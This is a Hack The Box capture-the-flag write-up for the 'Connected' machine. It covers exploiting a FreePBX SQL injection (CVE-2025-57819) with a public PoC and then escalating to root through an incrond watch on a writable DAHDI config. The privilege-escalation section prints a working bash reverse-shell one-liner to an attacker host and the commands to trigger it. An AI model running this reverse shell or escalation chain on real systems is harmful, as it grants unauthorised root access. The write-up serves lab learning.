---
title: Connected
summary: Hack The Box Linux machine exploiting a FreePBX SQL injection to RCE (CVE-2025-57819) for a foothold as asterisk, then abusing an incrond file-system watch on a writable DAHDI config to run a root reverse shell.
date: 2026-10-20
tags: [Hack The Box, FreePBX, SQLi, RCE, incron, PrivEsc]
difficulty: medium
os: Linux
url: https://app.hackthebox.com/machines/Connected
---

# CTF Room: Connected
- [Link to machine](https://app.hackthebox.com/machines/Connected)
- **Difficulty:** Medium
- **Category:** Web / PrivEsc
- **OS:** Linux

## 1. Brief
Connected runs FreePBX, and the version on the box is hit by CVE-2025-57819, a chain that turns an unauthenticated SQL injection into remote code execution. That drops me in as the `asterisk` user. From there, the box uses `incrond` (a file-system event daemon) to restart DAHDI whenever a trigger file is touched, and the config DAHDI runs on restart is writable by `asterisk`, so I drop a reverse shell into it and get root.

---

## 2. Recon

### NMAP Scan
I always start by scanning every port, then run version and script detection on whatever is open.

```bash
nmap -p- --min-rate 10000 connected.htb
nmap -p 22,80,443 -sCV connected.htb
```

Three ports: SSH (22), HTTP (80) and HTTPS (443). I added `connected.htb` to `/etc/hosts` and opened the site in a browser.

```bash
machine_ip connected.htb
```

### The web app
The site is **FreePBX version 16.0.40.7**. FreePBX is the web front end for an Asterisk PBX, so this is a telephony box. A bit of searching on that version turns up **CVE-2025-57819**, which it is vulnerable to.

---

## 3. Foothold - FreePBX RCE (CVE-2025-57819)

CVE-2025-57819 is an unauthenticated SQL injection in FreePBX that can be escalated to remote code execution. There is a public PoC on GitHub ([b4sh2/CVE-2025-57819-poc](https://github.com/b4sh2/CVE-2025-57819-poc/blob/main/README.md)) that handles the whole chain. In short, the script:

- Confirms the SQL injection by leaking the database version.
- Starts a TCP listener on a port I choose.
- Injects a reverse-shell cron job through the injection and checks the row actually landed in the database.
- Waits around 70 seconds for the callback, then drops me into an interactive shell and tries to upgrade it to a proper PTY.
- Cleans up after itself by removing the injected cron row.

Running the PoC gives me a shell as `asterisk`, and from there I can read the user flag.

```text
asterisk@connected:/$ cat user.txt
||<user flag>||
```

---

## 4. Privilege Escalation - incrond + writable DAHDI config

### Enumeration
Scheduled jobs are always worth a look for privilege escalation, so I went through the cron config by hand with `cat` rather than reaching for an automated script. The standard cron directories were nothing special, but reading them pointed me at a second scheduler on the box, `incrond`:

```bash
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/incron.d/
cat /etc/incron.d/*
```

`incrond` is not a normal cron daemon. It is a **file-system event daemon**: instead of running commands on a schedule, it runs configured commands when the paths it is watching change. System-wide rules live in `/etc/incron.d/`, each file holding watch entries that `incrond` loads, much like `cron` loads files from `/etc/cron.d/`.

What caught my eye is that the `incron.d` rules were watching files that the `asterisk` user can write to. For triggering a watch, `IN_CLOSE_WRITE` is the cleanest event: write to or touch the monitored file, close it, and `incrond` runs the configured command once the file operation finishes.

### The chain
One of the watch entries says that if `/var/spool/asterisk/sysadmin/dahdi_restart` is modified, it triggers a restart of the DAHDI service.

DAHDI (Digium/Asterisk Hardware Device Interface) is the hardware layer of Asterisk for traditional telephone equipment: analog cards, digital spans, timing devices and the related kernel modules. The stack is FreePBX (the web UI) on top of Asterisk (the PBX daemon) on top of DAHDI (the hardware layer underneath).

The second useful piece is that another file `asterisk` can write to, `/etc/dahdi/init.conf`, is the config DAHDI reads on startup. When a restart runs, `init.conf` executes the commands it contains. So if I append a reverse-shell one-liner to the bottom of it, the DAHDI restart will run my command as root.

### Exploit
Append the reverse shell to `init.conf`, then touch the trigger file so `incrond` restarts DAHDI:

```bash
printf '\nbash -i >& /dev/tcp/your_ip/6666 0>&1\n' >> /etc/dahdi/init.conf
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

With a listener waiting, the callback lands after about five seconds, as root.

```text
root@connected:~# cat root.txt
||<root flag>||
```

---

## 5. Flags / Proof

| Flag | Value |
|:--|:--|
| User flag | `||<user flag>||` |
| Root flag | `||<root flag>||` |

---

## 6. Summary
Connected is a clean two-step chain:

- **Known-CVE foothold.** A FreePBX version string pointed straight at CVE-2025-57819, an unauthenticated SQL injection escalated to RCE. The public PoC injects a cron job through the injection to get a shell as `asterisk`.
- **File-system events as a privesc primitive.** `incrond` runs root commands when watched files change. Because `asterisk` could write both the trigger file (`dahdi_restart`) and the config that runs on restart (`/etc/dahdi/init.conf`), touching the trigger ran a root reverse shell. Writable config plus a root-triggered action is the whole bug.

**Tools used:** `nmap`, the CVE-2025-57819 PoC, `cat` for manual cron enumeration, `incrond`.
